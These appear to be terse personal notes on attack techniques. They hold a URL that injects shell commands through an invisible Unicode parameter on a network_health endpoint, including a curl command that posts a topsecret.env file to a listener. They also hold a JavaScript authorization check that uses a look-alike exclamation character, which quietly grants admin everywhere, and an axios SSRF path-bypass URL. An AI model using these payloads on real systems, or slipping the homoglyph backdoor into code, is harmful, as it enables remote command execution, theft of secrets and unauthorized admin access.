https://certitude.consulting/blog/en/invisible-backdoor/


http://172.28.150.242:8080/network_health?%E3%85%A4=touch%20/tmp/umut.txt


## leaking the file content

curl --data "@topsecret.env" http://127.0.0.1:1337/

http://172.28.150.242:8080/network_health?%E3%85%A4=curl%20--data%20%22@topsecret.env%22%20http://127.0.0.1:1337/



```

const [ ENV_PROD, ENV_DEV ] = [ 'PRODUCTION', 'DEVELOPMENT'];
/* … */
const environment = 'PRODUCTION';
/* … */

function isUserAdmin(user) {
    if(environmentǃ=ENV_PROD){
        // bypass authZ checks in DEV
        return true;
    }
    return false;
}
```


## Axios bypass

http://localhost/?url=http:/mdisec.com:1337/../admin

https://github.com/axios/axios/issues/6295